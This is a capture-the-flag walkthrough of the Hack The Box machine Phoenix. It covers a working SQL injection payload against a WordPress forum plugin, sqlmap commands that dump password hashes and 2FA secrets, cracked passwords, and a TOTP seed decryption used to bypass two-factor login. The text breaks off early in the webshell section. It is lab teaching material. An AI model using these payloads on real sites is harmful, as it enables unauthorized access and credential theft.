---
title: HTB: Phoenix
url: https://0xdf.gitlab.io/2022/06/25/htb-phoenix.html
date: 2022-06-25T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-phoenix, ctf, htb-pressed, htb-static, nmap, wordpress, wpscan, wp-pie-register, wp-asgaros-forum, sqli, injection, time-based-sqli, sqlmap, hashcat, 2fa, wp-miniorange, totp, youtube, source-code, crypto, cyberchef, oathtool, wp-download-from-files, webshell, upload, pam, sch, unsch, pspy, proc, wildcard
---

![Phoenix](https://0xdfimages.gitlab.io/img/phoenix-cover.png)

Phoenix starts off with a WordPress site using a plugin with a blind SQL injection. This injection is quite slow, and I think leads to the poor reception for this box overall. Still, very slow blind SQL injection shows the value in learning to pull out only the bits you need from the DB. I’ll get usernames and password hashes, but that leaves me at a two factors prompt. I’ll reverse enginner that plugin to figure out what I need from the DB, and get the seed to generate the token. From there, I’ll abuse another plugin to upload a webshell and get a shell on the box. The first pivot involves password reuse and understanding the pam 2FA setup isn’t enabled on one interface. The next pivot is wildcard injection in a complied shell script. I’ll dump the script out (several ways), and then use the injection to get a shell as root.

## Box Info

| Name | [Phoenix](https://hackthebox.com/machines/phoenix)  [Phoenix](https://hackthebox.com/machines/phoenix) [Play on HackTheBox](https://hackthebox.com/machines/phoenix) |
| --- | --- |
| Release Date | [05 Mar 2022](https://twitter.com/hackthebox_eu/status/1499036944835256321) |
| Retire Date | 25 Jun 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Phoenix |
| Radar Graph | Radar chart for Phoenix |
| First Blood User | 02:55:36[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 03:21:08[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [jit jit](https://app.hackthebox.com/users/546210) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.149
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-24 20:44 UTC
Nmap scan report for phoenix.htb (10.10.11.149)
Host is up (0.10s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
oxdf@hacky$ nmap -p 22,80,443 -sCV 10.10.11.149
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-24 20:44 UTC
Nmap scan report for phoenix.htb (10.10.11.149)
Host is up (0.091s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to https://phoenix.htb/
443/tcp open  ssl/http Apache httpd
|_http-generator: WordPress 5.9
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache
|_http-title: Phoenix Security &#8211; Securing the future.
| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US
| Not valid before: 2022-02-15T20:08:43
|_Not valid after:  2032-02-13T20:08:43
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal. It’s interesting that Apache didn’t show a version number.

I’ll note that 80 is redirecting to `https://phoenix.htb`, and there’s a `robots.txt` disallowing `/wp-admin/`, which says this is likely WordPress.

The TLS certificate shows `phoenix.htb`, and manual inspection doesn’t give much else other than an email:

![image-20220215160327203](https://0xdfimages.gitlab.io/img/image-20220215160327203.png)

I’ll do a subdomain fuzz with `wfuzz` but not find anything else. I’ll add `phoenix.htb` to `/etc/hosts`.

### Website - TCP 443

#### Site

The site is for a security company:

[![image-20220214161152818](https://0xdfimages.gitlab.io/img/image-20220214161152818.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220214161152818.png)

There’s a link to the “Details” that has more information:

[![image-20220215160556806](https://0xdfimages.gitlab.io/img/image-20220215160556806.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220215160556806.png)

That page also has a link to the blog (`https://phoenix.htb/?post_type=post`):

[![image-20220214161448954](https://0xdfimages.gitlab.io/img/image-20220214161448954.png)](https://0xdfimages.gitlab.io/img/image-20220214161448954.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220214161448954.png)

There’s also a Forms page (`https://phoenix.htb/forum/`) which doesn’t have much activity yet:

![image-20220214161557123](https://0xdfimages.gitlab.io/img/image-20220214161557123.png)

There’s a lot of things I can try here that don’t lead to anything, like registering an account and trying to create forum posts.

#### Tech Stack

Based on the `robots.txt` file, the site is running WordPress. The response headers also confirm this:

```

HTTP/2 200 OK
Date: Tue, 15 Feb 2022 21:05:22 GMT
Server: Apache
Link: <https://phoenix.htb/wp-json/>; rel="https://api.w.org/", <https://phoenix.htb/wp-json/wp/v2/pages/92>; rel="alternate"; type="application/json", <https://phoenix.htb/>; rel=shortlink
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Vary: Accept-Encoding
Cache-Control: private, must-revalidate
Content-Length: 30594
Content-Type: text/html; charset=UTF-8

```

Still not much more information about Apache. Given it’s WordPress, the site will be hosted on PHP, which is confirmed by requesting `index.php` which loads the main page where `index.html` and `index.[anything else]` do not.

#### wpscan

Given the site is running Wordpress, I’ll run `wpscan` against it. I registered for a free API key from their site (which I store in the environment variabled `$WPSCAN_API`) which allows me to get vulnerability results as well. I’ll make sure to enumerate users, all themes, and all plugins to look for issues:

```

oxdf@hacky$ wpscan --url https://phoenix.htb --enumerate u,at,ap --disable-tls-checks --api-token $WPSCAN_API
...[snip]...

```

WordPress is running the latest version which doesn’t have any known issues:

```

[+] WordPress version 5.9 identified (Latest, released on 2022-01-25).
 | Found By: Rss Generator (Passive Detection)
 |  - https://phoenix.htb/feed/, <generator>https://wordpress.org/?v=5.9</generator>
 |  - https://phoenix.htb/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator>

```

`wpscan` identifies a handful of plugins, two of which have vulnerabilities identified.

The scan also identifies a handful of users:

```

[i] User(s) Identified:

[+] John Smith
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] jsmith
 | Found By: Wp Json Api (Aggressive Detection)
 |  - https://phoenix.htb/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Sitemap (Aggressive Detection)
 |   - https://phoenix.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] phoenix
 | Found By: Wp Json Api (Aggressive Detection)
 |  - https://phoenix.htb/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Oembed API - Author URL (Aggressive Detection)
 |   - https://phoenix.htb/wp-json/oembed/1.0/embed?url=https://phoenix.htb/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - https://phoenix.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] jane
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] jack
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

```

The first two users have a link, saying they were found via `https://phoenix.htb/wp-json/wp/v2/users/?per_page=100&page=1`. Visiting that shows details on these users:

[![image-20220215165146675](https://0xdfimages.gitlab.io/img/image-20220215165146675.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220215165146675.png)

Seeing that the user Phoenix is the “WordPress Administrator” and is user id 1 is useful.

#### Blocked

After running `wpscan`, the page returned differently:

```

oxdf@hacky$ curl https://phoenix.htb -k
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 403</p>
        <p>Message: Forbidden.</p>
        <p>Error code explanation: 403 - This IP has been blocked for excessive brute forcing. Block will be lifted in 60 seconds.</p>
    </body>
</html>

```

It seems there’s some brute force protection here. I’ll keep that in mind.

#### pie-register Vulnerabilities

`pie-register` has 14 identified vulnerabilities:

```

[+] pie-register
 | Location: https://phoenix.htb/wp-content/plugins/pie-register/
 | Latest Version: 3.7.4.2 
 | Last Updated: 2022-02-14T05:16:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 14 vulnerabilities identified:

```

However, at the bottom of this section, it says it couldn’t identify the version of this plugin (so it printed all known vulnerabilities):

```

 | The version could not be determined.

```

[This plugin](https://pieregister.com/) is all about creating registration forms. There is a registration link on the blog page:

![image-20220215162329512](https://0xdfimages.gitlab.io/img/image-20220215162329512.png)

And clicking leads to `/registration`:

![image-20220215162421934](https://0xdfimages.gitlab.io/img/image-20220215162421934.png)

Looking at the source for this page, there are several indications that the `pie-register` version is 3.7.2.6:

[![image-20220215162533031](https://0xdfimages.gitlab.io/img/image-20220215162533031.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220215162533031.png)

This eliminates all the vulnerabilities `wpscan` identified.

#### asgaros-forum Vulnerabilities

The other plugin with vulnerabilities is `asgaros-forum`, which I suspect is responsible for the forums:

```

[+] asgaros-forum
 | Location: https://phoenix.htb/wp-content/plugins/asgaros-forum/
 | Last Updated: 2022-01-30T12:54:00.000Z
 | [!] The version is out of date, the latest version is 2.0.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Asgaros Forum < 1.15.13 - Unauthenticated SQL Injection
 |     Fixed in: 1.15.13
 |     References:
 |      - https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24827
 |      - https://plugins.trac.wordpress.org/changeset/2611560/asgaros-forum
 |
 | [!] Title: Asgaros Forums < 1.15.14 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 1.15.14
 |     References:
 |      - https://wpscan.com/vulnerability/70b5fd89-4b59-4cbb-b60f-ac54fbb5a3e3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42365
 |      - https://www.wordfence.com/vulnerability-advisories/#CVE-2021-42365
 |
 | [!] Title: Asgaros Forum < 1.15.15 - Admin+ SQL Injection via forum_id
 |     Fixed in: 1.15.15
 |     References:
 |      - https://wpscan.com/vulnerability/c60a3d40-449c-4c84-8d13-68c04267c1d7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25045
 |      - https://plugins.trac.wordpress.org/changeset/2642215
 |                                                  
 | [!] Title: Asgaros Forum < 2.0.0 - Subscriber+ Blind SQL Injection
 |     Fixed in: 2.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/35272197-c973-48ad-8405-538bfbafa172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0411
 |      - https://plugins.trac.wordpress.org/changeset/2669226/asgaros-forum
 |
 | Version: 1.15.12 (10% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - https://phoenix.htb/wp-content/plugins/asgaros-forum/skin/widgets.css?ver=1.15.12  

```

Of the four vulnerabilities identified, two require admin level access (XSS and SQLi), [one](https://wpscan.com/vulnerability/35272197-c973-48ad-8405-538bfbafa172) requires “Subscriber” level access to get SQLI, and the [top one](https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1) is unauthenticated SQLI.

## Shell as wp-user

### SQLI

#### POC

Both of the SQL injections available to me (CVE-2021-24827 and CVE-2022-0411 (assuming I can create an account)) are both blind and time-based. I’ll start working with CVE-2021-24827, as it’s unauthenticated. I can get the POC from the `wpscan` [page](https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1) and try it:

```

oxdf@hacky$ time curl -k 'https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(10)'>/dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 30784    0 30784    0     0   2937      0 --:--:--  0:00:10 --:--:--  9729

real    0m10.488s
user    0m0.013s
sys     0m0.007s

```

It takes about 10 seconds to return (the result thrown to `/dev/null` since it doesn’t matter). That fits since the payload is a 10 seconds sleep (url decoded):

```

/forum/?subscribe_topic=1 union select 1 and sleep(10)

```

If I change the `sleep` to `sleep(1)` the time matches:

```

oxdf@hacky$ time curl -k 'https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(1)'>/dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 30781    0 30781    0     0  20896      0 --:--:--  0:00:01 --:--:-- 20896

real    0m1.483s
user    0m0.021s
sys     0m0.000s

```

There’s definitely SQL injection going on there.

#### sqlmap Identify

Time-based SQL injection is a pain to do manually, so I’ll turn to `sqlmap`. Given what I know about the vulnerability and that it’s WordPress (so probably using MySQL), I’ll give it parameters to speed up the test:

```

oxdf@hacky$ sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --dbms=mysql --technique=T
...[snip]...
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] 
[21:36:30] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[21:36:30] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('asgarosforum_unique_id=620c1cd656c1a;asgarosforum_unread_cleared=1000-01-01%...%3A00%3A00'). Do you want to use those [Y/n] 
[21:36:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:36:33] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[21:36:33] [INFO] testing for SQL injection on URI parameter '#1*'
[21:36:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:36:33] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)
[21:36:46] [WARNING] URI parameter '#1*' does not seem to be injectable
[21:36:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
...[snip]...

```

It doesn’t find anything. Since I know it’s there, I’ll try more aggressively (adding `--level 5`). This takes a bit, but finds the injection:

```

oxdf@hacky$ sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --dbms=mysql --technique=T --level 5
...[snip]...
[21:41:56] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[21:42:07] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replac
e' injectable 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value?
 [Y/n] 
[21:43:45] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 481 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind 
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: https://phoenix.htb:443/forum/?subscribe_topic=(CASE WHEN (8939=8939) THEN SLEEP(5) ELSE 89
39 END)
---
[21:45:04] [INFO] the back-end DBMS is MySQL
[21:45:04] [WARNING] it is very important to not stress the network connection during usage of time-base
d payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12
...[snip]...

```

It takes about three minutes to find that, but `sqlmap` has the injection point now.

#### Dump Phoenix / John Smith Hash

I started trying to enumerate the DB, but it’s just too slow. Because the DB is supporting WordPress, the tables and columns are well documented. I could also install WordPress onto a local VM and look at it more closely.

For example, [this page](https://usersinsights.com/wordpress-user-database-tables/) shows the columns in the `wp_users` table, which includes the `user_pass`. Because I know that Phoenix (user id 1) is the administrator, and John Smith (user id 5) is an author on the site, I’ll dump just their hashes using the syntax from above plus:
- `-D wordpress` - Select the WordPress database
- `-T wp_users` - Select the `wp_users` tables
- `-C id,user_pass` - Select the `id` and `user_pass` columns
- `--where "ID=1 or ID=5"` - Limit to only the two users who may be admins
- `--dump` - Dump the data

This runs for about eight minutes, but does produce the two hashes:

```

oxdf@hacky$ sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --dbms=mysql --technique=T --level 5 -D wordpress -T wp_users -C id,user_pass --where "ID=1 or ID=5" --dump
...[snip]...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: https://phoenix.htb:443/forum/?subscribe_topic=(CASE WHEN (8939=8939) THEN SLEEP(5) ELSE 8939 END)
---
[22:04:57] [INFO] testing MySQL
[22:04:57] [INFO] confirming MySQL
[22:04:57] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[22:04:57] [INFO] fetching entries of column(s) '`id`, user_pass' for table 'wp_users' in database 'wordpress'
[22:04:57] [INFO] [INFO] fetching number of column(s) '`id`, user_pass' entries for table 'wp_users' in database 'wordpress'
...[snip]...
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: wordpress
Table: wp_users
Database: wordpress
Table: wp_users
[2 entries]
+------+------------------------------------+
| id   | user_pass                          |
+------+------------------------------------+
| 1    | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc. |
| 5    | $P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G. |
+------+------------------------------------+

[22:13:19] [INFO] table 'wordpress.wp_users' dumped to CSV file '/home/oxdf/.sqlmap/output/phoenix.htb/dump/wordpress/wp_users.csv'

```

### Crack Hashes

The newer versions of `hashcat` will do mode detection for me which identifies these are mode 400, phppass, WordPress (MD5), Joomla (MD5):

```

$ /opt/hashcat-6.2.5/hashcat.bin hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF
...[snip]...
$P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc.:phoenixthefirebird14   
...[snip]...
$P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G.:superphoenix
...[snip]...

```

That’s passwords for both users:

```

phoenix:phoenixthefirebird14
john:superphoenix

```

### SSH - Fail

I’ll try each of these passwords with the username over SSH. I almost always connect with `sshpass`, but this is weird because it prints a banner, but then just returns to my local prompt:

```

oxdf@hacky$ sshpass -p 'phoenixthefirebird14' ssh phoenix@phoenix.htb
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|

```

I’ll drop out of `sshpass` and try entering the password manually:

```

oxdf@hacky$ ssh phoenix@phoenix.htb
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
Password:

```

It prints the banner, but then asks for the password. Entering the password just reprompts for the password:

```

oxdf@hacky$ ssh phoenix@phoenix.htb
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
Password: 
Password:

```

Doesn’t seem like either of these work.

### 2FA

#### Login

With creds, I’ll visit `https://phoenix.htb/wp-admin/`, which redirects to the `/login` page:

![image-20220215193817679](https://0xdfimages.gitlab.io/img/image-20220215193817679.png)

Regardless of which user I log in as, it pops a OTP prompt (which looks the same as the one used in [Pressed](/2022/02/03/htb-pressed.html#verifying-admin-creds)):

![image-20220215194412534](https://0xdfimages.gitlab.io/img/image-20220215194412534.png)

#### TOTP Background

Time-based One-Time Passwords (TOTP) are a common form of second factor authentication. The idea is that an application (typically but not exclusively) on a phone is generating a new (typically) numeric password using a standardized algorithm that takes time as an input. When a user logs in, on giving their username and password, they are prompted to send this additional password either with the original creds or after. The TOTP algorithm is described in [RFC-6238](https://datatracker.ietf.org/doc/html/rfc6238), but at a high level, the pointed needed for Phoenix are:
- A seed value is generated and shared between the user and the application.
- Each side stores the seed, the user typically in a phone application, and the site in the database associated somehow to the user.
- When the user logs in, both sides use the public algorithm to generate a code from the seed, and then the result is compared to prove the user has access.

This is considered “something you have” as far as [factors of authentication](https://csrc.nist.gov/glossary/term/Multi_Factor_Authentication#:~:text=under%20Multifactor%20Authentication-,Authentication%20using%20two%20or%20more%20factors%20to%20achieve%20authentication.,are%20(e.g.%2C%20biometric)) because for the average user they can’t generate the code without the phone that stores the seed.

I’ve run into this kind of two factor authentication before on HTB. In [Static](/2021/12/18/htb-static.html#recover-db), there’s a corrupt SQLite DB that includes the username, hash, and TOTP secret.

#### Find Seed Location

The [MiniOrange site](https://developers.miniorange.com/docs/security/wordpress/Two-factor-authentication-free/free-plugin-guidelines) has a lot of different options for different types of 2FA. Only one of them will work in a non-network connected lab like HackTheBox, the Google Authenticator version that uses TOTP as described above. That plugin can be downloaded [here](https://wordpress.org/plugins/miniorange-2-factor-authentication/).

I’ll walk through the source analysis [here](https://www.youtube.com/watch?v=gwlSlgORtnI):

The POST request ends up in `two_fa_pass2login.php`, which processes it and ends up here:

```

} else if ( isset( $mo2fa_login_status ) && $mo2fa_login_status == 'MO_2_FACTOR_CHALLENGE_GOOGLE_AUTHENTICATION' ) {
    $content = json_decode( $customer->validate_otp_token( 'GOOGLE AUTHENTICATOR', $user_email, null, $softtoken, get_option( 'mo2f_customerKey' ), get_option( 'mo2f_api_key' ) ), true );

```

The call to `validate_otp_token` ends up a few calls deeper at a call to `mo2f_google_authenticator_onpremise`:

```

function mo2f_google_authenticator_onpremise($otpToken){
    include_once dirname(dirname( __FILE__ )) . DIRECTORY_SEPARATOR. 'handler'.DIRECTORY_SEPARATOR. 'twofa' . DIRECTORY_SEPARATOR . 'gaonprem.php';
    $gauth_obj= new Google_auth_onpremise();
    $session_id_encrypt = isset( $_POST['session_id'] ) ? sanitize_text_field($_POST['session_id']) : null;
    if(is_user_logged_in()){
        $user = wp_get_current_user();
        $user_id = $user->ID;
    }else{
        $user_id = MO2f_Utility::mo2f_get_transient($session_id_encrypt, 'mo2f_current_user_id');
    }
    $secret= $gauth_obj->mo_GAuth_get_secret($user_id);
    $content=$gauth_obj->verifyCode($secret, $otpToken);
    return $content;
}

```

The two calls at the end, `mo_GAuth_get_secret` and `verifyCode` are what I’m looking for.

`mo_GAuth_get_secret` makes two calls to `get_user_meta` to get a key and an emcrypted secret, and then calls `decrypt_data` to decrpyt them.

```

function mo_GAuth_get_secret($user_id){
    global $Mo2fdbQueries;
    $key=get_user_meta( $user_id, 'mo2f_get_auth_rnd_string', true);
    $secret=get_user_meta( $user_id, 'mo2f_gauth_key', true);
    $secret=mo2f_GAuth_AESEncryption::decrypt_data($secret,$key);

    return $secret;
}

```

I’ll show it in WordPress Source the [video above](https://www.youtube.com/watch?v=gwlSlgORtnI), but `get_user_meta` is a [WordPress function](https://developer.wordpress.org/reference/functions/get_user_meta/) for getting data from the `wp_usermeta` table.

#### Read Secret / Key

[This](https://codex.wordpress.org/Database_Description#Table:_wp_usermeta) describes the `wp_usermeta` table:

![image-20220216111212029](https://0xdfimages.gitlab.io/img/image-20220216111212029.png)

I’ll update my `sqlmap` to dump these for the phoenix user. For example, to get the key, I’ll use `-T wp_usermeta -C meta_value --where "user_id=1 and meta_key = 'mo2f_get_auth_rnd_string'"`:

```

oxdf@hacky$ sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --dbms=mysql --technique=T --level 5 -D wordpress -T wp_usermeta -C meta_value --where "user_id=1 and meta_key = 'mo2f_get_auth_rnd_string'" --dump
...[snip]...
Database: wordpress                                 
Table: wp_usermeta                                  
[1 entry]                                           
+------------+                                      
| meta_value |
+------------+
| kHHxxX3f   |
+------------+
...[snip]...
oxdf@hacky$ sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --dbms=mysql --technique=T --level 5 -D wordpress -T wp_usermeta -C meta_value --where "user_id=1 and meta_key = 'mo2f_gauth_key'" --dump 
...[snip]...
 Database: wordpress
Table: wp_usermeta
[1 entry]
+--------------------------------------------------------------------------------------------------------------+
| meta_value                                                                                                   |
+--------------------------------------------------------------------------------------------------------------+
| qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNfqFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA= |
+--------------------------------------------------------------------------------------------------------------+

```

#### Decrypt Secret

Back in the source for the plugin, the secret and the key were passed to`decrypt_data`. It is a simple AES-128-CBC decryption:

```

public static function decrypt_data($data, $key) {
    $c = base64_decode($data);
    $ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
    $iv = substr($c, 0, $ivlen);
    $hmac = substr($c, $ivlen, $sha2len=32);
    $ciphertext_raw = substr($c, $ivlen+$sha2len);
    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
    $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);

    return $original_plaintext;
}

```

The IV for AES-128-CBC is 16 bytes, and the default HMAC length is 32 bytes. I’ll pull the IV :

```

oxdf@hacky$ echo "qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNfqFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA=" | base64 -d | xxd -p | tr -d '\n' | cut -c -32
a8610fc08e91401c45e1a5cce8f56eae

```

Then, get from byte 49 (so character 97) and on as the ciphertext:

```

oxdf@hacky$ echo "qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNfqFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA=" | base64 -d | xxd -p | tr -d '\n' | cut -c 97-
4db023a3135fa8578c8c9668488e723c5db91dde5bf2549a17f0e973a58c0530

```

I’ll dump all this into [CyberChef](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'kHHxxX3f'%7D,%7B'option':'Hex','string':'a8610fc08e91401c45e1a5cce8f56eae'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=NGRiMDIzYTMxMzVmYTg1NzhjOGM5NjY4NDg4ZTcyM2M1ZGI5MWRkZTViZjI1NDlhMTdmMGU5NzNhNThjMDUzMA), but it breaks:

![image-20220216113810658](https://0xdfimages.gitlab.io/img/image-20220216113810658.png)

I’ll try 0-padding the key to 16 bytes, by converting it to hex, and adding 16 0s to the end. It works!

![image-20220216113854789](https://0xdfimages.gitlab.io/img/image-20220216113854789.png)

#### oathtool / Login

With that seed, I can generate the current OTP using `oathtool`:

```

oxdf@hacky$ oathtool -b --totp 'PDEEWIVJSIDWS6WO'
701485

```

Submitting that works, and logs in:

[![image-20220216114106452](https://0xdfimages.gitlab.io/img/image-20220216114106452.png)](https://0xdfimages.gitlab.io/img/image-20220216114106452.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220216114106452.png)

### Webshell Upload

#### Enumeration

The system is relatively well hardened. Many of the old tricks such as modifying a theme or uploading a plugin as disabled from both users.

